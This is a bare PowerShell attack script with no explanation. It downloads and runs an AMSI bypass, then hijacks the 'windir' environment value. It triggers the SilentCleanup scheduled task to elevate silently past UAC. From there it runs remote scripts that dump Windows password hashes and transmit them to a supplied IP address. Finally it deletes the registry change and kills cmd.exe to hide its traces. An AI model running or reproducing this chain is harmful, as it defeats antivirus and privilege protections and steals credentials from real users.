
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1')
$registryPath = "HKCU:\Environment"
$Name = "windir"
$Value = "powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1');Get-PassHashes | Out-String | Invoke-Transmission -ip " + $ip + ";#"
Set-ItemProperty -Path $registryPath -Name $name -Value $Value
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
sleep 2
Remove-ItemProperty -Path $registryPath -Name $name
taskkill /f /im cmd.exe